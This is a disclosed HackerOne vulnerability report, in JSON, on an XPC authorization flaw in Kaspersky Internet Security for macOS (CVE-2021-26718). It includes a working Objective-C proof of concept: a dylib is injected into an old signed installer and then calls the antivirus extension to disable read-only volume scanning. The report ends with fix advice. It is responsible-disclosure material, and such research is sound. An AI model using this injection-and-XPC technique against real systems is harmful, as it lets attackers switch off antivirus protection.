{
  "id": 980876,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODA4NzY=",
  "url": "https://hackerone.com/reports/980876",
  "title": "[Fixed] KIS for macOS is vulnerable to AV bypass due to improper client authorization on XPC service",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2020-09-12T21:34:45.454Z",
  "submitted_at": "2020-09-12T21:34:45.497Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "theevilbit",
    "url": "/theevilbit",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/8hsvi4qds2ue17321zowk3omnlr3/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c?response-content-disposition=inline%3B%20filename%3D%225xjfKsYQ_400x400.jpg%22%3B%20filename%2A%3DUTF-8%27%275xjfKsYQ_400x400.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3DOTL4Z4%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T135457Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCP1h%2BMnyvDRDa6h%2F4zIodqh2MzJlGISvpnoEvR4kc2fgIgP8fAE6zkU2xDXiIdq36r00FCUyYf6OQc2MuvlpSL6zgqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDJ2sbhPrB5o6p2UkMiqPBcMZAZzMf1lo6ftFZmyVLqm8Hg2J3xbj6a3GuTLabMbNJWiA%2FZsFo0hE3gxRPbyAqhG6FJuKINNLYiqNvOekzW8sar88psZuM%2FX9%2FNoLvFSAVVJpHHBKNZUcwzDsSG6dL68X0%2F81p9YWjmvjokQY%2B9nuD7359WQ659K26Fclw65VMeRybJ1hUyi2a%2FyS4P%2FH0PoUc1H0vEsvCcDRZFSU2VqX6BFziwRAbmxLuUXTN5m%2F5hWF5b3%2BkgFf3EOVPo%2BXtyBL0zsVvefLcDnkTyLYtjGuMSoKMfdzhMUUnoy%2FSkL%2FnqSrrhe9QDnvuA12WJYXs7dXUtOgD1FweSHqkAlJgnKNM8PYSjJnvj8q9w4J7BBdDstdMKFug3p2hl8P0Z3ewTKwgYQFTrJSgQ5k2oIl05GLUuZEuGlOhqiAdJ0VSwCyoN%2BcsLtWKUwcF5i%2BGCo6ppjPFD80qdzVR70b4ApfmQxVQXMoqtkj6LQcYtZ%2BagRqhM%2BtszUfSlLJd2TtHW1cmvfHpY38mbjTqSHEOfCoz%2FpdesWuHOFHT%2FPgVGOwrKnQpNMV%2FyR1KqF%2B%2F4CD%2FGMR2tktKBwuNfh2OlxQvwD2aE8XvEC%2B4mc3056ID7XSvkKVVQ5FPigZOQTgvmJ494qVF7ehsKzqTF%2B9hAoK4S6zfV7Rj7ZQPgHv3om4hYuHsgUcaD29IgjjBb7uAyiaX%2BnWynmxhoDSjS8R%2BX%2Fh548W%2F5oeVorlsLKwzmcY%2Fn5eCd84hK21TQBO83%2FN5WvC2Rjqcrcse3ypMcrNI7pSoyAYBbW7BZ7x1FSQkjJ0k9%2BmmuCWHGFTK1yvtjTnkqMZorU8FXNTbF9f5hhpv%2FD%2Bx%2FaaWxL40nM7EEpqTFiYBitKsZow7cCtrgY6sQExtT%2FZOBwnOUsXGGVn22KELl38mJ%2B5OivmNc%2Fgks2i4L3ET0mxTFvDVZpjL316NVv%2FbrIj%2Fy2VtfGofe3Raptm7CsozbMN%2FwB4%2F%2B1rcHUIoVQ8JJTc06nsi5aVYzNhXnbrwhbQkoT0dxKYDFETL%2B6%2F051XAavIrnvB5CtHwa5YaT7z83h5GNqUOlmAh9%2BiDFNSkfEsNFaYzGytNE8syYguoEi7iDkqQjn2z2qwL4LrkcU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=412487bb88da54df33f5db4c0e5e865e7377bc79c6c7b9d179e9c3986da4b555"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 2379,
    "url": "https://hackerone.com/kaspersky",
    "handle": "kaspersky",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/379/d7dc3ce53a84816885872fb423816bfbbbd36390_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/379/d7dc3ce53a84816885872fb423816bfbbbd36390_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Kaspersky",
      "twitter_handle": "kaspersky",
      "website": "http://www.kaspersky.com",
      "about": "Kaspersky is the world’s largest privately-held vendor of endpoint protection and cybersecurity solutions for business and consumers."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2021-26718"
  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-04-01T12:18:34.134Z",
  "bug_reporter_agreed_on_going_public_at": "2021-04-01T11:14:36.474Z",
  "team_member_agreed_on_going_public_at": "2021-04-01T12:18:33.947Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "> Note! Thank you for your report. For the purposes of the further analysis of the vulnerability, that you kindly report to us, could you please fill *all* fields [in square brackets]. This information will help us to respond you more quickly and triage your report. Thanks a lot for your assistance.\n\n**Summary**\nKaspersky Internet Security uses endpoint security system extension (SEXT) from Big Sur. The system extension performs all of the AV functionality, like process monitoring, network monitoring, etc... the configuration of the SEXT is performed via XPC. Due to improper client verification on the XPC service a normal user can achieve full control of the extension and potentially disable all AV functionality.\n\n**Description**\nThe Mach service name for the XPC connection can be found in the `Info.plist` file of the system extension.\n\n```\n<key>NEMachServiceName</key>\n\t\t███\n```\n\nUsing this string we can initiate connection. The handler for the first contact is the `shouldAcceptNewConnection:` method of the `IPCService` class.\n\n```objectivec\n/* @class IPCService */\n-(char)listener:(void *)arg2 shouldAcceptNewConnection:(void *)arg3 {\n    rbx = self;\n    r15 = [arg3 retain];\n    var_48 = objc_opt_new(@class(NSString));\n    rax = [r15 processIdentifier];\n    r14 = rax;\n    █████████\n\nloc_100005a0a:\n    if ([*(rbx + 0x10) isEqualToString:var_48] == 0x0) goto loc_100005b1b;\n\nloc_100005a27:\n    rax = [NSXPCInterface interfaceWithProtocol:@protocol(IPCServiceProtocol)]; \n```\n\nThe service only verifies if the Team ID is the one expected, but nothing else. Unfortunately this allows someone talk to the XPC service who can inject code into a custom Kaspersky process. The latest version of the AV is properly hardened against injection attacks, however that is not tru to older versions. What an attacker can do is downloading an old version of KIS and injecting code into that.\n\nDownloading the `kavmac20.0.0.829aar_cs_da_de_en_es_es_fi_fr_it_nb_nl_pl_pt_pt_ru_sv_tr_21444.dmg` contains an installer that allows the injection of custom dylibs as library validation is disabled via the `com.apple.security.cs.disable-library-validation` entitlement.\n\n```\nExecutable=/Volumes/Kaspersky Internet Security/Kaspersky Downloader.app/Contents/MacOS/Downloader\nIdentifier=com.kaspersky.kav.downloader\nFormat=app bundle with Mach-O thin (x86_64)\nCodeDirectory v=20500 size=8072 flags=0x10000(runtime) hashes=243+5 location=embedded\nSignature size=8985\nTimestamp=2019. Oct 9. 13:20:29\nInfo.plist entries=18\nTeamIdentifier=2Y8XE5CQ94\nRuntime Version=10.14.0\nSealed Resources version=2 rules=13 files=155\nInternal requirements count=1 size=188\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>com.apple.security.cs.allow-unsigned-executable-memory</key>\n\t<true/>\n\t<key>com.apple.security.cs.disable-library-validation</key>\n\t<true/>\n</dict>\n</plist>\n```\n\n## Exploitation, POC\nWe will use a technique called dylib proxying. We will replace the `libkl_appkit.dylib` what we can find in the Installer's folder.\n\n```\n % ls -l /Volumes/Kaspersky\\ Internet\\ Security/Kaspersky\\ Downloader.app/Contents/MacOS \ntotal 3392\n-rwxr-xr-x  1 csaby  staff  1015904 Oct  9  2019 Downloader\n-rwxr-xr-x  1 csaby  staff   569152 Oct  9  2019 libkl_appkit.dylib\n-rwxr-xr-x  1 csaby  staff   144256 Oct  9  2019 libz.1.2.11.dylib\n```\n\nAlso we will prepare putting this installer in the `/Users/Shared` directory. Our POC needs to be prepared as follows.\n\n```\n████████\n██████\n█████████\n█████\n```\n\n1. We compile our dylib with reexporting the original dylib, which we renamed to `libkl_appkit_orig.dylib`.\n2. We correct the dylib path in the compiled dylib\n3. We sign the dylib, either with a valid or adhoc signature. Here I used a valid.\n4. Lastly we copy the dylib into its place\n\nThen if we execute the installer our dylib will be loaded.\n\nThe POC looks as follows:\n\n```objectivec\n#import <Foundation/Foundation.h>\n\nstatic NSString* kXPCHelperMachServiceName = @\"2Y8XE5CQ94.com.kaspersky.kav.sysext\";\n\n@protocol IPCServiceProtocol <NSObject>\n- (void)getEndpointForProtocol:(NSString *)arg1 withReply:(void (^)(NSError *, NSXPCListenerEndpoint *))arg2;\n@end\n\n@protocol FileMonitorProtocol\n- (void)DisableReadonlyVolumeScan:(BOOL)arg1 reply:(void (^)(BOOL))arg2;\n- (void)StartFileMonitor:(void (^)(BOOL))arg1;\n@end\n\n__attribute__((constructor))\nstatic void customConstructor(int argc, const char **argv) {\n        \n\n        NSString*  _serviceName = kXPCHelperMachServiceName;\n\n        NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];\n    \n        [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(IPCServiceProtocol)]];\n    \n        [_agentConnection resume];\n\n        id agent = [_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error)\n        {\n            NSLog(@\"[-] Something went wrong\");\n            NSLog(@\"[-] Error: %@\", error);\n        }];\n\n        //we first get the FileMonitorProtocol as an NSXPCListenerEndpoint\n        [agent getEndpointForProtocol:@\"FileMonitorProtocol\" withReply:^(NSError * err, NSXPCListenerEndpoint * endpoint) {\n            NSLog(@\"Reply, %@\", err);\n            \n            //once we get the NSXPCListenerEndpoint, we can create a new connection and use its methods\n            NSXPCConnection* processConnection = [[NSXPCConnection alloc] initWithListenerEndpoint:endpoint];\n            [processConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(FileMonitorProtocol)]];\n            [processConnection resume];\n     \n            id remoteObjectProxy = [processConnection remoteObjectProxy];\n                 \n            [remoteObjectProxy DisableReadonlyVolumeScan:1 reply:^(BOOL b){\n                 NSLog(@\"Reply, %hhd\", b);\n            }];\n        }];\n\n    \n    NSLog(@\"Done\");\n}\n```\n\nFirst we setup our connection, and we can only invoke one method, which is the `getEndpointForProtocol`. This is the function what we can use to get the XPC endpoint for the various functionalities. The connection is no longer verified at those protocols.\n\nIn the POC I ask for the `FileMonitorProtocol`, but I could do any other (e.g.: `ConnectionInterceptorProtocol`), there are plenty.\n\nOnce I get back the endpoint, I setup a new connection and invoke the `DisableReadonlyVolumeScan` method, which will disable the scan of read only volumes.\n\nThis will be reflected in the system logs upon execution:\n\n```\nFileMonitor: disabling read-only volume scan\n```\n\nIt also reveals a bug in the UI, as the KIS UI is not updated reflecting the change, there is no \"pull\" of the current configuration from the system extension, so the UI and the SEXT will be out of sync.\n\n## How to fix it properly?\n1. The client process verification in the `shouldAcceptNewConnection` call should verify the the following:\n\na. The connecting process is signed by Apple\nb. The connecting process is signed by your team ID\nc. The connecting process is identified by your bundle ID\nd. The connecting process has a minimum software version, where the fix has been implemented or it's hardened against injection  attacks.\n\nFor identifying the client at first place, the `audit_token` should be used instead of the PID, as the second is vulnerable to PID reuse attacks.\n\n2. Beyond that the client which is allowed to connect has to be compiled with hardened runtime or library validation, without possessing the following entitlements:\n```\ncom.apple.security.cs.allow-dyld-environment-variables\ncom.apple.security.cs.disable-library-validation\ncom.apple.security.get-task-allow\n```\n\nas these entitlements would allow another process to inject code into the app, and thus allowing it to talk to the SEXT.\n\n**Environment**\n- Scope: Application\n- Product name: Kaspersky Internet Security\n- Product version: 21.0.0.464\n- OS name and version (incl SP): Big Sur Beta 6 (20A5364e)\n- Attack type: Bypass/LPE\n- Maximum user privileges needed to reproduce your issue: no privileges\n\n**Steps to reproduce**\nThe old version of KIS installer with the compiled and injected dylib attached. Extract it in `/Users/Shared` and run. Monitoring the logs the message `FileMonitor: disabling read-only volume scan` will show up from the process `com.kaspersky.kav.sysext`.\n\nAlternatively attached the source code for the poc, and prepare it (`/Users/Shared/Kaspersky Downloader.app` should be downloaded before):\n```\n████████\n████████\n██████\n█████████\n```\n\n**Other info**\nNA\n\n## Impact\n\nFull control of the AV as normal user",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2021-05-01T11:14:36.576Z",
  "allow_singular_disclosure_after": -87964820.46705998,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "mirchr",
    "battle_angel",
    "ali",
    "eren",
    "aporlorxl23",
    "tevest",
    "nevergiveup16",
    "destinybrown"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
